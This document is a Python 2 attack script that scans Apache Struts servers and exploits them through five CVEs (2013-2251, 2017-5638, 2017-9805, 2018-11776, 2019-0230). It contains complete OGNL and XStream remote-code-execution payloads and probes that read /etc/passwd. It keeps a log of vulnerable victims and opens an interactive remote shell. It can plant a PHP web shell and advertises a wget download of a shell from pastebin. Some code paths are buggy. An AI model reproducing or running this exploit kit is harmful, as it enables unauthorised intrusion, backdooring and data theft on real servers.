#!/usr/bin/python
import requests
import sys
import os
import commands
import readline
import urlparse
import random

RED = '\033[1;31m'
BLUE = '\033[94m'
BOLD = '\033[1m'
GREEN = '\033[32m'
OTRO = '\033[36m'
YELLOW = '\033[33m'
ENDC = '\033[0m'

def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])
cls()

logo = BLUE+'''                                                             
  ___   _____  ___    _   _  _____  ___   
 (  _`\(_   _)|  _`\ ( ) ( )(_   _)(  _`\ 
 | (_(_) | |  | (_) )| | | |  | |  | (_(_)
 `\__ \  | |  | ,  / | | | |  | |  `\__ \ 
 ( )_) | | |  | |\ \ | (_) |  | |  ( )_) |
 `\____) (_)  (_) (_)(_____)  (_)  `\____) 

        =[ Command Execution v4]=
              By @s1kr10s                                                                                                            
'''+ENDC

if len(sys.argv) < 2:
	print logo
	print "\nUso: python ApacheStruts.py http(s)://www.victima.com/files.login\n"
	sys.exit(1)
print logo

host = sys.argv[1]
poc = "?redirect:${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27chapalapachala%27%29,%23w.flush%28%29,%23w.close%28%29}"

def info():
	print YELLOW+"   [-] GET PROMPT...\n"+ENDC
	print BOLD+"   * [UPLOAD SHELL]"+ENDC
	print OTRO+"     Struts@Shell:$ pwnd (php)"+ENDC
	print BOLD+"   * [DOWNLOAD SHELL]"+ENDC
	print OTRO+"     wget https://pastebin.com/raw/baJmN8G8 -O /tmp/status.php\n"+ENDC

def parse_url(url):
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    site = scheme + '://' + urlparse.urlparse(url).netloc

    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    try:
        filename = url.split('/')[-1]
    except IndexError:
        filename = ''

    file_dir = file_path.rstrip(filename)
    if (file_dir == ''):
        file_dir = '/'

    return({"site": site, "file_dir": file_dir, "filename": filename})

def build_injection_inputs(url):
    parsed_url = parse_url(url)
    injection_inputs = []
    url_directories = parsed_url["file_dir"].split("/")

    try:
        url_directories.remove("")
    except ValueError:
        pass

    for i in range(len(url_directories)):
        injection_entry = "/".join(url_directories[:i])

        if not injection_entry.startswith("/"):
            injection_entry = "/%s" % (injection_entry)

        if not injection_entry.endswith("/"):
            injection_entry = "%s/" % (injection_entry)

        injection_entry += "{{INJECTION_POINT}}/"  # It will be renderred later with the payload.
        injection_entry += parsed_url["filename"]
        injection_inputs.append(injection_entry)

    return(injection_inputs)

def check(url):
    random_value = int(''.join(random.choice('0123456789') for i in range(2)))
    multiplication_value = random_value * random_value

    injection_points = build_injection_inputs(url)

    parsed_url = parse_url(url)
    attempts_counter = 0

    for injection_point in injection_points:
        attempts_counter += 1
        testing_url = "%s%s" % (parsed_url["site"], injection_point)
        testing_url = testing_url.replace("{{INJECTION_POINT}}", "${{%s*%s}}" % (random_value, random_value))
        try:
            resp = requests.get(testing_url, headers=headers, verify=False, timeout=timeout, allow_redirects=False)
        except Exception as e:
            continue
        if "Location" in resp.headers.keys():
            if str(multiplication_value) in resp.headers['Location']:
                #print("[*] Status: Vulnerable!")
                return(injection_point)
    return(None)

def validador():
	return ["file%20/etc/passwd","dir","net%20users","id","/sbin/ifconfig","cat%20/etc/passwd"]

def CVE_2013_2251(comando):
	return "?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{"+comando+"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}"

def CVE_2017_5638(comando):
	return "Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='"+str(comando)+"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'cmd.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}"

def CVE_2017_9805(comando):
    return '''
                <map>
                <entry>
                <jdk.nashorn.internal.objects.NativeString>
                <flags>0</flags>
                <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                <iter class="javax.imageio.spi.FilterIterator">
                <iter class="java.util.Collections$EmptyIterator"/>
                <next class="java.lang.ProcessBuilder">
                <command>
                <string>/bin/sh</string><string>-c</string><string>'''+ comando +'''</string>
                </command>
                <redirectErrorStream>false</redirectErrorStream>
                </next>
                </iter>
                <filter class="javax.imageio.ImageIO$ContainsFilter">
                <method>
                <class>java.lang.ProcessBuilder</class>
                <name>start</name>
                <parameter-types/>
                </method>
                <name>foo</name>
                </filter>
                <next class="string">foo</next>
                </serviceIterator>
                <lock/>
                </cipher>
                <input class="java.lang.ProcessBuilder$NullInputStream"/>
                <ibuffer/>
                <done>false</done>
                <ostart>0</ostart>
                <ofinish>0</ofinish>
                <closed>false</closed>
                </is>
                <consumed>false</consumed>
                </dataSource>
                <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
                </value>
                </jdk.nashorn.internal.objects.NativeString>
                <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
                </entry>
                <entry>
                <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                </entry>
                </map>
                '''

def CVE_2018_11776(comando):
	return "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27"+comando+"%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"

def CVE_2019_0230(comando):
	return "id=%{#_memberAccess.allowPrivateAccess=true,#_memberAccess.allowStaticMethodAccess=true,#_memberAccess.excludedClasses=#_memberAccess.acceptProperties,#_memberAccess.excludedPackageNamePatterns=#_memberAccess.acceptProperties,#res=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=@java.lang.Runtime@getRuntime(),#s=new java.util.Scanner(#a.exec('"+ comando + "').getInputStream()).useDelimiter('\\\\A'),#str=#s.hasNext()?#s.next():'',#res.print(#str),#res.close()}"

def identTools():
	print "   ACTIVE SYSTEM TOOLS:"
	py = requests.get(host+CVE_2013_2251("'which','python'")).content
	pe = requests.get(host+CVE_2013_2251("'which','perl'")).content
	ph = requests.get(host+CVE_2013_2251("'which','php'")).content
	cu = requests.get(host+CVE_2013_2251("'which','curl'")).content
	wg = requests.get(host+CVE_2013_2251("'which','wget'")).content
	nc = requests.get(host+CVE_2013_2251("'which','nc'")).content
	ne = requests.get(host+CVE_2013_2251("'which','netcat'")).content
	pi = requests.get(host+CVE_2013_2251("'which','ping'")).content

	print "     Python: %s" % py.strip()
	print "     Perl: %s" % pe.strip()
	print "     Php: %s" % ph.strip()
	print "     Curl: %s" % cu.strip()
	print "     Wget: %s" % wg.strip()
	print "     Nc: %s" % nc.strip()
	print "     Netcat: %s" % ne.strip()
	print "     Ping: %s" % pi.strip()

if len(host) > 0:
	if host.find("https://") != -1 or host.find("http://") != -1:

		# CVE-2013-2251 ---------------------------------------------------------------------------------
		try:
			response = requests.get(host+poc).content
		except:
			print RED+" Servidor no responde\n"+ENDC
			exit(0)

		print BOLD+"\n [+] RUN EXPLOIT CVE-2013-2251"+ENDC
		if "chapalapachala" in response:
				print RED+"   [-] VULNERABLE"+ENDC
				owned = open('vulnsite.txt', 'a')
				owned.write(str(host)+'\n')
				owned.close()

				opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
				if opcion == 's':
					info()
					identTools()
					
					while 1:
						separador = raw_input(GREEN+"Struts2@CVE-2013-2251 $ "+ENDC)
						espacio = separador.split(' ')
						comando = "','".join(espacio)

						if espacio[0] != 'pwnd':
							response = requests.get(host+CVE_2013_2251("'"+str(comando)+"'"))
							print response.content

						elif espacio[0] == 'pwnd':
							pathsave=raw_input("path EJ:/tmp/: ")
							if espacio[1] == 'php':
								shellfile = "'python','-c','\"f%3Dopen(\""+str(pathsave)+"statux.php\",\"w\");f.write(\"<?php%20system($_GET[ksujenenuhw])?>\")\"'"
								#shellfile = """'python','-c','f%3dopen("/tmp/statux.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
								requests.get(host+CVE_2013_2251(str(shellfile)))

								response = requests.get(host+CVE_2013_2251("'ls','-l','"+pathsave+"status.php'"))
								if response.content.find(pathsave+"status.php") != -1:
									print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
								else:
									print BOLD+RED+"\nNo Create File :/\n"+ENDC

		print BLUE+"     [-] NO VULNERABLE TO CVE-2013-2251"+ENDC



		# CVE-2017-5638 ---------------------------------------------------------------------------------				
		print BOLD+" [+] RUN EXPLOIT CVE-2017-5638"+ENDC
		x = 0
		while x < len(validador()):
			valida = validador()[x]

			try:

				headers = {
						'User-Agent': 'Mozilla/5.0', 
						'Content-Type': CVE_2017_5638(str(valida))
						}
				response = requests.get(host, headers=headers).content

			  	if response.find("ASCII") != -1 or response.find("No such") != -1 or response.find("Directory of") != -1 or response.find("Volume Serial") != -1 or response.find(" netmask ") != -1 or response.find("root:") != -1 or response.find("groups=") != -1 or response.find("User accounts for") != -1 or response.find("de usuario de") != -1:
			  		print RED+"   [-] VULNERABLE"+ENDC
			  		owned = open('vulnsite.txt', 'a')
					owned.write(str(host)+'\n')
					owned.close()

					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
					if opcion == 's':
						info()

					  	while 1:
							comando = raw_input(GREEN+"\nStruts2@CVE-2017-5638 $ "+ENDC)

							headers = {
									'User-Agent': 'Mozilla/5.0', 
									'Content-Type': CVE_2017_5638(str(comando))
									}
							print requests.get(host, headers=headers).content
					else:
						x = len(validador())
			except:
				pass
			x=x+1
		print BLUE+"     [-] NO VULNERABLE TO CVE-2017-5638"+ENDC



		# CVE-2018-11776 ---------------------------------------------------------------------------------			
		print BOLD+" [+] RUN EXPLOIT CVE-2018-11776"+ENDC
		parsed_url = parse_url(host)
		injection_point = check(host)

		if injection_point is not None:
			print RED+"   [-] VULNERABLE"+ENDC
	  		owned = open('vulnsite.txt', 'a')
			owned.write(str(host)+'\n')
			owned.close()

			opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
			if opcion == 's':
				info()

				while 1:
					comando = raw_input(GREEN+"\nStruts2@CVE-2018-11776 $ "+ENDC)
					testing_url = "%s%s" % (parsed_url["site"], injection_point)
		    		testing_url = testing_url.replace("{{INJECTION_POINT}}", CVE_2018_11776(str(comando)))
	    			
	    			headers = {
				    	'User-Agent': 'Mozilla/5.0',
				    	'Accept': '*/*'
						}
			        print requests.get(testing_url, headers=headers, verify=False, timeout=3, allow_redirects=False).text

		print BLUE+"     [-] NO VULNERABLE TO CVE-2018-11776"+ENDC



		# CVE-2017-9805 ---------------------------------------------------------------------------------
		print BOLD+" [+] RUN EXPLOIT CVE-2017-9805"+ENDC
		x = 0
		while x < len(validador()):
			valida = validador()[x]

			try:
				headers = {
					'User-Agent': 'Mozilla/5.0',
            		'Content-Type': 'application/xml'
            	}
				response = requests.post(host, data=CVE_2017_9805(str(valida)), headers=headers).content

			  	if response.find("ASCII") != -1 or response.find("No such") != -1 or response.find("Directory of") != -1 or response.find("Volume Serial") != -1 or response.find(" netmask ") != -1 or response.find("root:") != -1 or response.find("groups=") != -1 or response.find("User accounts for") != -1 or response.find("de usuario de") != -1:
			  		print RED+"   [-] VULNERABLE"+ENDC
			  		owned = open('vulnsite.txt', 'a')
					owned.write(str(host)+'\n')
					owned.close()

					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
					if opcion == 's':
						info()

					  	while 1:
					  		comando = raw_input(GREEN+"\nStruts2@CVE-2017-9805 $ "+ENDC)

							headers = {
								'User-Agent': 'Mozilla/5.0',
			            		'Content-Type': 'application/xml'
			            		}
					  		print requests.post(host, data=CVE_2017_9805(str(valida)), headers=headers).content
					else:
						x = len(validador())
			except:
				pass
			x=x+1
		print BLUE+"     [-] NO VULNERABLE TO CVE-2017-9805"+ENDC



		# CVE-2019-0230 ---------------------------------------------------------------------------------
		print BOLD+" [+] RUN EXPLOIT CVE-2019-0230"+ENDC
		x = 0
		while x < len(validador()):
			valida = validador()[x]

			try:
				headers = {
					'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
				    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
				    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
				    'Accept-Encoding':'gzip, deflate',
				    'Connection':'close',
				    'Cookie':'JSESSIONID=48FCD5D2DFB1E3CDF753E62011186CBC',
				    'Content-Type':'application/x-www-form-urlencoded',
				    'Content-Length':'576'
				    }

				url = urlparse.urlparse(host).netloc
				response = requests.post(url=url + "/index.action", headers=headers, data=CVE_2019_0230(comando)).content

				if response.find("ASCII") != -1 or response.find("No such") != -1 or response.find("Directory of") != -1 or response.find("Volume Serial") != -1 or response.find(" netmask ") != -1 or response.find("root:") != -1 or response.find("groups=") != -1 or response.find("User accounts for") != -1 or response.find("de usuario de") != -1:
					print RED+"   [-] VULNERABLE"+ENDC
			  		owned = open('vulnsite.txt', 'a')
					owned.write(str(host)+'\n')
					owned.close()

					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
					if opcion == 's':
						info()

					  	while 1:
							comando = raw_input(GREEN+"\nStruts2@CVE-2019-0230 $ "+ENDC)
							print requests.post(url=url + "/index.action", headers=headers, data=CVE_2019_0230(comando)).content
			except:
				pass
			x=x+1
		print BLUE+"     [-] NO VULNERABLE TO CVE-2019-0230"+ENDC


	
	else:
		print RED+" Dominio debe tener un (https o http)\n"+ENDC
		exit(0)
else:
	print RED+" Debe Ingresar una Url\n"+ENDC
	exit(0)

